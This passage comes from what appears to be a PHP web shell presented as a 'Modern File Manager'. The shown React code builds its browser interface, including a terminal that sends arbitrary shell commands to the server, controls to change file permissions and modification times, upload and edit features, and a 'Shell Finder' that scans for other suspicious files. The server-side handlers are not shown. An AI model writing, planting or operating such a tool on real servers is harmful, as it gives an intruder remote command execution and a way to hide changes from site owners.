                                            className="w-full text-left px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors flex items-center space-x-2"
                                        >
                                            <Icons.FolderPlus />
                                            <span>Unzip</span>
                                        </button>
                                    )}
                                </div>
                            )}
                        </div>
                        
                        <button
                            onClick={handleGo}
                            disabled={!selectedAction || isProcessing}
                            className="px-6 py-2 bg-gradient-to-r from-blue-500 to-purple-600 dark:from-neon-blue dark:to-neon-purple hover:shadow-neon text-white rounded-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                            {isProcessing ? 'Processing...' : 'Go'}
                        </button>
                    </div>
                </div>
            );
        };

        // Shell Finder Notification Component
        const ShellNotification = ({ notification, onClose }) => {
            const [isClosing, setIsClosing] = useState(false);
            const [startX, setStartX] = useState(0);
            const [currentX, setCurrentX] = useState(0);
            const [isDragging, setIsDragging] = useState(false);
            const notificationRef = useRef(null);

            const handleTouchStart = (e) => {
                setStartX(e.touches[0].clientX);
                setIsDragging(true);
            };

            const handleTouchMove = (e) => {
                if (!isDragging) return;
                const touchX = e.touches[0].clientX;
                const deltaX = touchX - startX;
                if (deltaX > 0) { // Only allow swipe to right
                    setCurrentX(deltaX);
                }
            };

            const handleTouchEnd = () => {
                if (currentX > 100) { // Threshold for swipe
                    handleClose();
                } else {
                    setCurrentX(0);
                }
                setIsDragging(false);
            };

            const handleClose = () => {
                setIsClosing(true);
                setTimeout(() => {
                    onClose(notification.id);
                }, 300);
            };

            return (
                <div
                    ref={notificationRef}
                    className={`fixed top-4 right-4 z-50 w-80 bg-yellow-600 dark:bg-yellow-700 text-white p-4 rounded-lg shadow-lg border-l-4 border-yellow-400 swipe-container ${
                        isClosing ? 'animate-slide-out-right' : 'animate-slide-in-right'
                    }`}
                    style={{
                        transform: `translateX(${currentX}px)`,
                        transition: isDragging ? 'none' : 'transform 0.2s ease-out'
                    }}
                    onTouchStart={handleTouchStart}
                    onTouchMove={handleTouchMove}
                    onTouchEnd={handleTouchEnd}
                >
                    <div className="flex items-start space-x-3">
                        <div className="text-yellow-200 mt-1">
                            ⚠️
                        </div>
                        <div className="flex-1">
                            <h4 className="font-bold text-sm mb-1">Suspicious File Detected!</h4>
                            <p className="text-sm mb-1">
                                <strong>File:</strong> {notification.file}
                            </p>
                            <p className="text-sm mb-1">
                                <strong>Path:</strong> {notification.path}
                            </p>
                            <p className="text-xs text-yellow-200 mt-2">
                                👉 Swipe right to dismiss
                            </p>
                        </div>
                    </div>
                </div>
            );
        };

        // Command Terminal Component (now toggleable)
        const CommandTerminal = ({ isVisible, onToggle }) => {
            const [command, setCommand] = useState('');
            const [output, setOutput] = useState('');
            const [isExecuting, setIsExecuting] = useState(false);

            const executeCommand = async () => {
                if (!command.trim() || isExecuting) return;

                setIsExecuting(true);
                
                try {
                    const form = new FormData();
                    form.append('action', 'execute_command');
                    form.append('command', command);

                    // Menggunakan performAction untuk loading
                    const result = await performAction(window.location.href, {
                        method: 'POST',
                        body: form
                    }, 'Executing command...');
                    
                    let displayOutput = '';
                    if (result.output) {
                        displayOutput += result.output;
                    }
                    if (result.error) {
                        displayOutput += '\nError: ' + result.error;
                    }
                    if (!result.output && !result.error) {
                        displayOutput = 'Command executed successfully (no output)';
                    }

                    setOutput(displayOutput);
                } catch (error) {
                    setOutput('Error executing command: ' + error.message);
                } finally {
                    setIsExecuting(false);
                }
            };

            const handleKeyPress = (e) => {
                if (e.key === 'Enter' && !e.shiftKey) {
                    e.preventDefault();
                    executeCommand();
                }
            };

            if (!isVisible) return null;

            return (
                <div className="bg-light-surface dark:bg-dark-surface border border-light-border dark:border-dark-border rounded-lg p-4">
                    <div className="flex items-center justify-between mb-3">
                        <div className="flex items-center space-x-2">
                            <Icons.Terminal />
                            <span className="font-medium text-blue-600 dark:text-neon-blue">Command Terminal</span>
                        </div>
                        <button
                            onClick={onToggle}
                            className="text-gray-400 hover:text-gray-600 dark:hover:text-gray-300"
                        >
                            <Icons.Close />
                        </button>
                    </div>
                    
                    <div className="flex space-x-2 mb-3">
                        <input
                            type="text"
                            value={command}
                            onChange={(e) => setCommand(e.target.value)}
                            onKeyPress={handleKeyPress}
                            placeholder="Enter command (e.g., ls, pwd, cat filename.txt)..."
                            className="flex-1 p-3 bg-gray-50 dark:bg-dark-bg border border-light-border dark:border-dark-border rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-neon-blue font-mono text-sm"
                            disabled={isExecuting}
                        />
                        <button
                            onClick={executeCommand}
                            disabled={!command.trim() || isExecuting}
                            className="px-6 py-3 bg-gradient-to-r from-blue-500 to-purple-600 dark:from-neon-blue dark:to-neon-purple hover:shadow-neon text-white rounded-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center space-x-2"
                        >
                            <Icons.Play />
                            <span>{isExecuting ? 'Running...' : 'Run'}</span>
                        </button>
                    </div>

                    {output && (
                        <div className="bg-gray-900 dark:bg-black text-green-400 p-3 rounded-lg font-mono text-sm whitespace-pre-wrap max-h-40 overflow-y-auto">
                            {output}
                        </div>
                    )}
                </div>
            );
        };

        // File Filter Component
        const FileFilter = ({ searchTerm, onSearchChange }) => {
            return (
                <div className="bg-light-surface dark:bg-dark-surface border border-light-border dark:border-dark-border rounded-lg p-4">
                    <div className="flex items-center space-x-2 mb-3">
                        <Icons.Search />
                        <span className="font-medium text-blue-600 dark:text-neon-blue">Filter Files & Folders</span>
                    </div>
                    
                    <input
                        type="text"
                        value={searchTerm}
                        onChange={(e) => onSearchChange(e.target.value)}
                        placeholder="Type to filter files and folders..."
                        className="w-full p-3 bg-gray-50 dark:bg-dark-bg border border-light-border dark:border-dark-border rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-neon-blue"
                    />
                </div>
            );
        };

        // Image Viewer Component
        const ImageViewer = ({ isOpen, onClose, imageSrc, imageName }) => {
            if (!isOpen) return null;

            return (
                <div className="fixed inset-0 bg-black bg-opacity-90 backdrop-blur-custom flex items-center justify-center z-50 p-4">
                    <div className="relative max-w-[95vw] max-h-[95vh] flex flex-col">
                        {/* Close button */}
                        <button
                            onClick={onClose}
                            className="absolute -top-12 right-0 p-2 text-white hover:text-gray-300 transition-colors z-10 bg-black bg-opacity-70 rounded-full hover:bg-opacity-90"
                            title="Close"
                        >
                            <Icons.Close />
                        </button>
                        
                        {/* Image title */}
                        <div className="absolute -top-12 left-0 text-white text-lg font-medium bg-black bg-opacity-70 px-4 py-2 rounded">
                            {imageName}
                        </div>

                        {/* Image container */}
                        <div className="flex items-center justify-center">
                            <img
                                src={imageSrc || "/placeholder.svg"}
                                alt={imageName}
                                className="max-w-full max-h-[90vh] object-contain rounded-lg shadow-2xl"
                                style={{ 
                                    maxWidth: '95vw', 
                                    maxHeight: '90vh',
                                    minWidth: '200px',
                                    minHeight: '200px'
                                }}
                                onError={(e) => {
                                    e.target.src = "/placeholder.svg?height=400&width=400&text=Image+not+found";
                                }}
                            />
                        </div>
                    </div>
                </div>
            );
        };

        // Drag & Drop Upload Component
        const DragDropUpload = ({ onUpload }) => {
            const [isDragActive, setIsDragActive] = useState(false);
            const [isDragOver, setIsDragOver] = useState(false);

            const handleDragEnter = (e) => {
                e.preventDefault();
                e.stopPropagation();
                setIsDragActive(true);
            };

            const handleDragLeave = (e) => {
                e.preventDefault();
                e.stopPropagation();
                setIsDragActive(false);
                setIsDragOver(false);
            };

            const handleDragOver = (e) => {
                e.preventDefault();
                e.stopPropagation();
                setIsDragOver(true);
            };

            const handleDrop = (e) => {
                e.preventDefault();
                e.stopPropagation();
                setIsDragActive(false);
                setIsDragOver(false);

                const files = e.dataTransfer.files;
                if (files && files[0]) {
                    onUpload(files[0]);
                }
            };

            const handleFileSelect = (e) => {
                const files = e.target.files;
                if (files && files[0]) {
                    onUpload(files[0]);
                }
                e.target.value = ''; // Reset input
            };

            return (
                <div
                    className={`relative p-3 border-2 border-dashed rounded-lg transition-all cursor-pointer group ${
                        isDragOver
                            ? 'border-blue-500 dark:border-neon-blue bg-blue-50 dark:bg-blue-900 dark:bg-opacity-20 shadow-lg dark:shadow-neon drag-active'
                            : isDragActive
                            ? 'border-blue-400 dark:border-neon-blue bg-blue-25 dark:bg-blue-900 dark:bg-opacity-10'
                            : 'border-light-border dark:border-dark-border bg-gray-100 dark:bg-dark-bg hover:border-blue-400 dark:hover:border-neon-blue hover:shadow-lg dark:hover:shadow-neon'
                    }`}
                    onDragEnter={handleDragEnter}
                    onDragLeave={handleDragLeave}
                    onDragOver={handleDragOver}
                    onDrop={handleDrop}
                    title="Drag & Drop files here or click to select"
                >
                    <input
                        type="file"
                        className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
                        onChange={handleFileSelect}
                        multiple={false}
                    />
                    
                    <div className="flex items-center justify-center">
                        <div className={`transition-all ${isDragOver ? 'scale-110' : 'group-hover:scale-105'}`}>
                            <Icons.Upload />
                        </div>
                    </div>

                    {/* Drag overlay */}
                    {isDragOver && (
                        <div className="absolute inset-0 flex items-center justify-center bg-blue-500 bg-opacity-10 dark:bg-neon-blue dark:bg-opacity-10 rounded-lg">
                            <div className="text-center">
                                <div className="text-blue-600 dark:text-neon-blue mb-1">
                                    <Icons.Upload />
                                </div>
                                <p className="text-xs text-blue-600 dark:text-neon-blue font-medium">
                                    Drop here
                                </p>
                            </div>
                        </div>
                    )}
                </div>
            );
        };

        // Modal Component
        const Modal = ({ isOpen, onClose, title, children }) => {
            if (!isOpen) return null;

            return (
                <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 p-4">
                    <div className="bg-light-surface dark:bg-dark-surface border border-light-border dark:border-dark-border rounded-lg shadow-neon max-w-4xl w-full max-h-[90vh] overflow-hidden">
                        <div className="flex items-center justify-between p-4 border-b border-light-border dark:border-dark-border">
                            <h3 className="text-lg font-semibold text-blue-600 dark:text-neon-blue">{title}</h3>
                            <button
                                onClick={onClose}
                                className="text-gray-400 hover:text-gray-900 dark:hover:text-white transition-colors"
                            >
                                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                                </svg>
                            </button>
                        </div>
                        <div className="p-4 overflow-auto max-h-[calc(90vh-120px)]">
                            {children}
                        </div>
                    </div>
                </div>
            );
        };

        // File Editor Modal
        const FileEditor = ({ isOpen, onClose, filename, content, onSave }) => {
            const [editContent, setEditContent] = useState(content);

            useEffect(() => {
                setEditContent(content);
            }, [content]);

            const handleSave = () => {
                onSave(editContent);
                onClose();
            };

            return (
                <Modal isOpen={isOpen} onClose={onClose} title={`Edit: ${filename}`}>
                    <div className="space-y-4">
                        <textarea
                            value={editContent}
                            onChange={(e) => setEditContent(e.target.value)}
                            className="w-full h-96 bg-gray-50 dark:bg-dark-bg border border-light-border dark:border-dark-border rounded-lg p-4 text-gray-900 dark:text-white font-mono text-sm resize-none focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-neon-blue"
                            placeholder="Enter your code here..."
                        />
                        <div className="flex justify-end space-x-3">
                            <button
                                onClick={onClose}
                                className="px-6 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded-lg transition-colors"
                            >
                                Cancel
                            </button>
                            <button
                                onClick={handleSave}
                                className="px-6 py-2 bg-gradient-to-r from-blue-500 to-purple-600 dark:from-neon-blue dark:to-neon-purple hover:shadow-neon text-white rounded-lg transition-all"
                            >
                                Save
                            </button>
                        </div>
                    </div>
                </Modal>
            );
        };

        // Rename Modal
        const RenameModal = ({ isOpen, onClose, currentName, onRename }) => {
            const [newName, setNewName] = useState(currentName);

            useEffect(() => {
                setNewName(currentName);
            }, [currentName]);

            const handleRename = () => {
                if (newName.trim() && newName !== currentName) {
                    onRename(newName);
                }
                onClose();
            };

            return (
                <Modal isOpen={isOpen} onClose={onClose} title={`Rename: ${currentName}`}>
                    <div className="space-y-4">
                        <input
                            type="text"
                            value={newName}
                            onChange={(e) => setNewName(e.target.value)}
                            className="w-full p-3 bg-gray-50 dark:bg-dark-bg border border-light-border dark:border-dark-border rounded-lg text-black dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-neon-blue"
                            placeholder="Enter new name..."
                        />
                        <div className="flex justify-end space-x-3">
                            <button
                                onClick={onClose}
                                className="px-6 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded-lg transition-colors"
                            >
                                Cancel
                            </button>
                            <button
                                onClick={handleRename}
                                className="px-6 py-2 bg-gradient-to-r from-blue-500 to-purple-600 dark:from-neon-blue dark:to-neon-purple hover:shadow-neon text-white rounded-lg transition-all"
                            >
                                Rename
                            </button>
                        </div>
                    </div>
                </Modal>
            );
        };

        // Permission Modal
        const PermissionModal = ({ isOpen, onClose, filename, currentPermissions, onSave }) => {
            const [permissions, setPermissions] = useState(currentPermissions);

            useEffect(() => {
                setPermissions(currentPermissions);
            }, [currentPermissions]);

            const handleSave = () => {
                if (permissions.match(/^[0-7]{3}$/)) {
                    onSave(permissions);
                }
                onClose();
            };

            return (
                <Modal isOpen={isOpen} onClose={onClose} title={`Edit Permissions: ${filename}`}>
                    <div className="space-y-4">
                        <div>
                            <label className="block text-sm font-medium mb-2">Permissions (e.g., 755, 644)</label>
                            <input
                                type="text"
                                value={permissions}
                                onChange={(e) => setPermissions(e.target.value)}
                                pattern="[0-7]{3}"
                                maxLength="3"
                                className="w-full p-3 bg-gray-50 dark:bg-dark-bg border border-light-border dark:border-dark-border rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-neon-blue"
                                placeholder="755"
                            />
                            <p className="text-sm text-gray-500 mt-1">Common: 755 (rwxr-xr-x), 644 (rw-r--r--)</p>
                        </div>
                        <div className="flex justify-end space-x-3">
                            <button
                                onClick={onClose}
                                className="px-6 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded-lg transition-colors"
                            >
                                Cancel
                            </button>
                            <button
                                onClick={handleSave}
                                className="px-6 py-2 bg-gradient-to-r from-blue-500 to-purple-600 dark:from-neon-blue dark:to-neon-purple hover:shadow-neon text-white rounded-lg transition-all"
                            >
                                Save
                            </button>
                        </div>
                    </div>
                </Modal>
            );
        };

        // DateTime Modal
        const DateTimeModal = ({ isOpen, onClose, filename, currentDateTime, onSave }) => {
            const [dateTime, setDateTime] = useState('');

            useEffect(() => {
                if (currentDateTime) {
                    const date = new Date(currentDateTime * 1000);
                    const formatted = date.toISOString().slice(0, 19);
                    setDateTime(formatted);
                }
            }, [currentDateTime]);

            const handleSave = () => {
                if (dateTime) {
                    onSave(dateTime);
                }
                onClose();
            };

            return (
                <Modal isOpen={isOpen} onClose={onClose} title={`Edit Date/Time: ${filename}`}>
                    <div className="space-y-4">
                        <div>
                            <label className="block text-sm font-medium mb-2">Date and Time</label>
                            <input
                                type="datetime-local"
                                value={dateTime}
                                onChange={(e) => setDateTime(e.target.value)}
                                step="1"
                                className="w-full p-3 bg-gray-50 dark:bg-dark-bg border border-light-border dark:border-dark-border rounded-lg text-gray-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 dark:focus:ring-neon-blue"
                            />
                        </div>
                        <div className="flex justify-end space-x-3">
                            <button
                                onClick={onClose}
                                className="px-6 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded-lg transition-colors"
                            >
                                Cancel
                            </button>
                            <button
                                onClick={handleSave}
                                className="px-6 py-2 bg-gradient-to-r from-blue-500 to-purple-600 dark:from-neon-blue dark:to-neon-purple hover:shadow-neon text-white rounded-lg transition-all"
                            >
                                Save
                            </button>
                        </div>
                    </div>
                </Modal>
            );
        };

        // Main File Manager Component
        const FileManager = () => {
            const [selectedItems, setSelectedItems] = useState([]);
            const [showEditor, setShowEditor] = useState(false);
            const [showImageViewer, setShowImageViewer] = useState(false);
            const [editingFile, setEditingFile] = useState({ name: '', content: '' });
            const [viewingImage, setViewingImage] = useState({ name: '', src: '' });
            const [showCreateFile, setShowCreateFile] = useState(false);
            const [showCreateFolder, setShowCreateFolder] = useState(false);
            const [showRename, setShowRename] = useState(false);
            const [showPermissions, setShowPermissions] = useState(false);
            const [showDateTime, setShowDateTime] = useState(false);
            const [currentItem, setCurrentItem] = useState({ name: '', permissions: '', modified: 0 });
            const [newItemName, setNewItemName] = useState('');
            const [darkMode, setDarkMode] = useState(true);
            const [showToast, setShowToast] = useState(false);
            const [toastMessage, setToastMessage] = useState('');
            const [showTerminal, setShowTerminal] = useState(false);
            const [searchTerm, setSearchTerm] = useState('');
            const [notifications, setNotifications] = useState([]);
            const [isScanning, setIsScanning] = useState(false);

            // PHP data passed to JavaScript
            const items = <?php echo json_encode($items); ?>;
            const currentDir = <?php echo json_encode($currentDir); ?>;
            const breadcrumbs = <?php echo json_encode($breadcrumbs); ?>;
            const relativeCurrentDir = <?php echo json_encode($relativeCurrentDir); ?>;

            useEffect(() => {
                if (darkMode) {
                    document.documentElement.classList.add('dark');
                } else {
                    document.documentElement.classList.remove('dark');
                }
            }, [darkMode]);

            // Filter items based on search term
            const filteredItems = items.filter(item =>
                item.name.toLowerCase().includes(searchTerm.toLowerCase())
            );

            // ZIP operation handler dengan loading
            const handleZip = async (itemsToZip) => {
                try {
                    const form = new FormData();
                    form.append('action', 'zip_files');
                    itemsToZip.forEach(item => {
                        form.append('items[]', item);
                    });

                    const result = await performAction(window.location.href, {
                        method: 'POST',
                        body: form
                    }, 'Compressing…');
                    
                    if (result.success) {
                        setToastMessage(result.message);
                        setShowToast(true);
                        setTimeout(() => {
                            setShowToast(false);
                            window.location.reload();
                        }, 2000);
                    } else {
                        setToastMessage('Error: ' + result.message);
                        setShowToast(true);
                        setTimeout(() => setShowToast(false), 5000);
                    }
                } catch (error) {
                    setToastMessage('Error during compression: ' + error.message);
                    setShowToast(true);
                    setTimeout(() => setShowToast(false), 5000);
                }
            };

            // UNZIP operation handler dengan loading
            const handleUnzip = async (zipFile) => {
                try {
                    const form = new FormData();
                    form.append('action', 'unzip_file');
                    form.append('filename', zipFile);

                    const result = await performAction(window.location.href, {
                        method: 'POST',
                        body: form
                    }, 'Extracting…');
                    
                    if (result.success) {
                        setToastMessage(result.message);
                        setShowToast(true);
                        setTimeout(() => {
                            setShowToast(false);
                            window.location.reload();
                        }, 2000);
                    } else {
                        setToastMessage('Error: ' + result.message);
                        setShowToast(true);
                        setTimeout(() => setShowToast(false), 5000);
                    }
                } catch (error) {
                    setToastMessage('Error during extraction: ' + error.message);
                    setShowToast(true);
                    setTimeout(() => setShowToast(false), 5000);
                }
            };

            // Shell Finder function dengan loading
            const runShellFinder = async () => {
                setIsScanning(true);
                showLoading('Scanning for suspicious files…');
                
                try {
                    const url = new URL(window.location.href);
                    url.searchParams.set('action', 'shell_scan');
                    
                    const response = await fetch(url.toString());
                    const result = await response.json();
                    
                    if (result.success && result.files.length > 0) {
                        // Create notifications for each suspicious file
                        result.files.forEach((file, index) => {
                            setTimeout(() => {
                                const notification = {
                                    id: Date.now() + index,
                                    file: file.file,
                                    path: file.path,
                                    directory: file.directory
                                };
                                setNotifications(prev => [...prev, notification]);
                            }, index * 500); // Stagger notifications
                        });
                    } else {
                        setToastMessage('No suspicious files found!');
                        setShowToast(true);
                        setTimeout(() => setShowToast(false), 3000);
                    }
                } catch (error) {
                    console.error('Shell scan error:', error);
                    setToastMessage('Error during scan');
                    setShowToast(true);
                    setTimeout(() => setShowToast(false), 3000);
                } finally {
                    setIsScanning(false);
                    hideLoading();
                }
            };

            const removeNotification = (id) => {
                setNotifications(prev => prev.filter(n => n.id !== id));
            };

            // Check if file is an image
            const isImageFile = (filename) => {
                const imageExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp', '.svg', '.ico'];
                const extension = filename.toLowerCase().substring(filename.lastIndexOf('.'));
                return imageExtensions.includes(extension);
            };

            const handleSelectItem = (itemName) => {
                setSelectedItems(prev => 
                    prev.includes(itemName) 
                        ? prev.filter(item => item !== itemName)
                        : [...prev, itemName]
                );
            };

            const handleFileClick = (filename) => {
                if (isImageFile(filename)) {
                    // Show image viewer for image files
                    setViewingImage({ name: filename, src: filename });
                    setShowImageViewer(true);
                } else {
                    // Show editor for non-image files
                    handleEditFile(filename);
                }
            };

            const handleEditFile = async (filename) => {
                showLoading('Loading file…');
                
                try {
                    // Use the PHP endpoint to read file contents with proper encoding
                    const url = new URL(window.location.href);
                    url.searchParams.set('action', 'read_file');
                    url.searchParams.set('file', filename);
                    
                    const response = await fetch(url.toString(), {
                        method: 'GET',
                        headers: {
                            'Accept': 'text/plain',
                        }
                    });
                    
                    if (!response.ok) {
                        throw new Error(`HTTP error! status: ${response.status}`);
                    }
                    
                    const content = await response.text();
                    setEditingFile({ name: filename, content });
                    setShowEditor(true);
                } catch (error) {
                    console.error('Error loading file:', error);
                    // Show editor with error message if file can't be loaded
                    setEditingFile({ 
                        name: filename, 
                        content: `// Error loading file: ${error.message}\n// Please check file permissions and try again.` 
                    });
                    setShowEditor(true);
                } finally {
                    hideLoading();
                }
            };

            const handleSaveFile = async (content) => {
                showLoading('Saving file…');
                
                try {
                    const form = new FormData();
                    form.append('action', 'save_file');
                    form.append('filename', editingFile.name);
                    form.append('content', content);
                    
                    await fetch(window.location.href, {
                        method: 'POST',
                        body: form
                    });
                    
                    window.location.reload();
                } catch (error) {
                    setToastMessage('Error saving file: ' + error.message);
                    setShowToast(true);
                    setTimeout(() => setShowToast(false), 5000);
                } finally {
                    hideLoading();
                }
            };

            const handleCreateItem = async (type) => {
                if (!newItemName.trim()) return;
                
                showLoading(`Creating ${type}…`);
                
                try {
                    const form = new FormData();
                    form.append('action', type === 'file' ? 'create_file' : 'create_folder');
                    form.append(type === 'file' ? 'filename' : 'foldername', newItemName);
                    
                    await fetch(window.location.href, {
                        method: 'POST',
                        body: form
                    });
                    
                    window.location.reload();
                } catch (error) {
                    setToastMessage(`Error creating ${type}: ` + error.message);
                    setShowToast(true);
                    setTimeout(() => setShowToast(false), 5000);
                } finally {
                    hideLoading();
                }
            };

            const handleDelete = async () => {
                if (selectedItems.length === 0) return;
                
                showLoading('Deleting items…');
                
                try {
                    const form = new FormData();
                    form.append('action', 'delete');
                    selectedItems.forEach(item => {
                        form.append('items[]', item);
                    });
                    
                    await fetch(window.location.href, {
                        method: 'POST',
                        body: form
                    });
                    
                    window.location.reload();
                } catch (error) {
                    setToastMessage('Error deleting items: ' + error.message);
                    setShowToast(true);
                    setTimeout(() => setShowToast(false), 5000);
                } finally {
                    hideLoading();
                }
            };

            const handleUpload = async (file) => {
                showLoading('Uploading…');
                
                try {
                    const form = new FormData();
                    form.append('action', 'upload_file');
                    form.append('file', file);
                    
                    await fetch(window.location.href, {
                        method: 'POST',
                        body: form
                    });
                    
                    window.location.reload();
                } catch (error) {
                    setToastMessage('Error uploading file: ' + error.message);
                    setShowToast(true);
                    setTimeout(() => setShowToast(false), 5000);
                } finally {
                    hideLoading();
                }
            };

            const handleRename = async (newName) => {
                showLoading('Renaming…');
                
                try {
                    const form = new FormData();
                    form.append('action', 'rename');
                    form.append('old_name', currentItem.name);
                    form.append('new_name', newName);
                    
                    await fetch(window.location.href, {
                        method: 'POST',
                        body: form
                    });
                    
                    window.location.reload();
                } catch (error) {
                    setToastMessage('Error renaming item: ' + error.message);
                    setShowToast(true);
                    setTimeout(() => setShowToast(false), 5000);
                } finally {
                    hideLoading();
                }
            };

            const handlePermissionChange = async (permissions) => {
                showLoading('Changing permissions…');
                
                try {
                    const form = new FormData();
                    form.append('action', 'change_permissions');
                    form.append('filename', currentItem.name);
                    form.append('permissions', permissions);
                    
                    await fetch(window.location.href, {
                        method: 'POST',
                        body: form
                    });
                    
                    window.location.reload();
                } catch (error) {
                    setToastMessage('Error changing permissions: ' + error.message);
                    setShowToast(true);
                    setTimeout(() => setShowToast(false), 5000);
                } finally {
                    hideLoading();
                }
            };

            const handleDateTimeChange = async (datetime) => {
                showLoading('Updating date/time…');
                
                try {
                    const form = new FormData();
                    form.append('action', 'change_datetime');
                    form.append('filename', currentItem.name);
                    form.append('datetime', datetime);
                    
                    await fetch(window.location.href, {
                        method: 'POST',
                        body: form
                    });
                    
                    window.location.reload();
                } catch (error) {
                    setToastMessage('Error updating date/time: ' + error.message);
                    setShowToast(true);
                    setTimeout(() => setShowToast(false), 5000);
                } finally {
                    hideLoading();
                }
            };

            const formatFileSize = (bytes) => {
                if (bytes === 0) return '0 B';
                const k = 1024;
                const sizes = ['B', 'KB', 'MB', 'GB'];
                const i = Math.floor(Math.log(bytes) / Math.log(k));
                return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
            };

            const formatDate = (timestamp) => {
                return new Date(timestamp * 1000).toLocaleString();
            };

            const copyFileLink = async (filename) => {
                try {
                    // Construct the public URL using the relative path from document root
                    // This ensures we're only using the publicly accessible part of the path
                    let publicPath = relativeCurrentDir;
                    
                    // Ensure the path has a leading slash and no trailing slash
                    publicPath = '/' + publicPath.replace(/^\/+/, '').replace(/\/+$/, '');
                    
                    // If we're in the root directory, don't add an extra slash
                    if (publicPath === '/') {
                        publicPath = '';
                    }
                    
                    // Construct the full URL
                    const fullURL = `${window.location.origin}${publicPath}/${filename}`;
                    
                    await navigator.clipboard.writeText(fullURL);
                    setToastMessage('Link copied!');
                    setShowToast(true);
                    
                    // Hide toast after 2 seconds
                    setTimeout(() => {
                        setShowToast(false);
                    }, 2000);
                } catch (error) {
                    console.error('Failed to copy link:', error);
                    setToastMessage('Failed to copy link');
                    setShowToast(true);
                    setTimeout(() => {
                        setShowToast(false);
                    }, 2000);
                }
            };

            return (
                <div className="min-h-screen bg-light-bg dark:bg-dark-bg transition-colors">
                    {/* Shell Finder Notifications */}
                    {notifications.map((notification, index) => (
                        <ShellNotification
                            key={notification.id}
                            notification={notification}
                            onClose={removeNotification}
                            style={{ top: `${4 + index * 120}px` }}
                        />
                    ))}

                    {/* Header */}
                    <div className="bg-light-surface dark:bg-dark-surface border-b border-light-border dark:border-dark-border p-4">
                        <div className="flex items-center justify-between">
                            <h1 className="text-2xl font-bold bg-gradient-to-r from-blue-600 to-purple-600 dark:from-neon-blue dark:to-neon-purple bg-clip-text text-transparent">
                                Modern File Manager 2025 – With Global Loading
                            </h1>
                            
                            {/* Action Buttons */}
                            <div className="flex items-center space-x-2">
                                {/* Dark Mode Toggle */}
                                <button
                                    onClick={() => setDarkMode(!darkMode)}
                                    className="p-3 bg-gray-100 dark:bg-dark-bg border border-light-border dark:border-dark-border rounded-lg hover:shadow-lg dark:hover:shadow-neon transition-all"
                                    title="Toggle Dark Mode"
                                >
                                    {darkMode ? <Icons.Sun /> : <Icons.Moon />}
                                </button>

                                {/* Shell Finder Button */}
                                <button
                                    onClick={runShellFinder}
                                    disabled={isScanning}
                                    className="p-3 bg-yellow-500 hover:bg-yellow-600 border border-yellow-400 rounded-lg hover:shadow-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed text-white"
                                    title="Shell Finder - Scan for suspicious files"
                                >
                                    {isScanning ? (
                                        <div className="animate-spin">
                                            <Icons.Warning />
                                        </div>
                                    ) : (
                                        <Icons.Warning />
                                    )}
                                </button>

                                {/* Terminal Toggle Button */}
                                <button
                                    onClick={() => setShowTerminal(!showTerminal)}
                                    className="p-3 bg-gray-100 dark:bg-dark-bg border border-light-border dark:border-dark-border rounded-lg hover:shadow-lg dark:hover:shadow-neon transition-all"
                                    title="Toggle Command Terminal"
                                >
                                    <Icons.Terminal />
                                </button>
                                
                                <button
                                    onClick={() => setShowCreateFile(true)}
                                    className="p-3 bg-gray-100 dark:bg-dark-bg border border-light-border dark:border-dark-border rounded-lg hover:shadow-lg dark:hover:shadow-neon transition-all group"
                                    title="Create New File"
                                >
                                    <Icons.File />
                                </button>
                                <button
                                    onClick={() => setShowCreateFolder(true)}
                                    className="p-3 bg-gray-100 dark:bg-dark-bg border border-light-border dark:border-dark-border rounded-lg hover:shadow-lg dark:hover:shadow-neon transition-all group"
                                    title="Create New Folder"
                                >
                                    <Icons.FolderPlus />
                                </button>
                                
                                {/* Drag & Drop Upload */}
                                <DragDropUpload onUpload={handleUpload} />
                                
                                <button
                                    onClick={handleDelete}
                                    disabled={selectedItems.length === 0}
                                    className="p-3 bg-red-600 border border-red-500 rounded-lg hover:shadow-lg dark:hover:shadow-neon-purple transition-all disabled:opacity-50 disabled:cursor-not-allowed text-white"
                                    title="Delete Selected"
                                >
                                    <Icons.Delete />
                                </button>
                            </div>
                        </div>

                        {/* Breadcrumbs */}
                        <div className="flex items-center space-x-2 mt-4 text-sm">
                            {breadcrumbs.map((crumb, index) => (
                                <React.Fragment key={index}>
                                    {index > 0 && <span className="text-gray-500">/</span>}
                                    <button
                                        onClick={() => {
                                            const newPath = breadcrumbs.slice(0, index + 1).join('/');
                                            showLoading('Navigating to folder…');
                                            window.location.href = `?dir=${encodeURIComponent(newPath)}`;
                                        }}
                                        className="text-blue-600 dark:text-neon-blue hover:text-purple-600 dark:hover:text-neon-purple transition-colors"
                                    >
                                        {crumb || 'Root'}
                                    </button>
                                </React.Fragment>
                            ))}
                        </div>
                    </div>

                    {/* File Filter */}
                    <div className="p-4 pb-0">
                        <FileFilter searchTerm={searchTerm} onSearchChange={setSearchTerm} />
                    </div>

                    {/* Action Dropdown */}
                    <div className="p-4 pb-0">
                        <ActionDropdown 
                            selectedItems={selectedItems}
                            onZip={handleZip}
                            onUnzip={handleUnzip}
                            isProcessing={false}
                        />
                    </div>

                    {/* Command Terminal (toggleable) */}
                    {showTerminal && (
                        <div className="p-4 pb-0">
                            <CommandTerminal 
                                isVisible={showTerminal} 
                                onToggle={() => setShowTerminal(false)} 
                            />
                        </div>
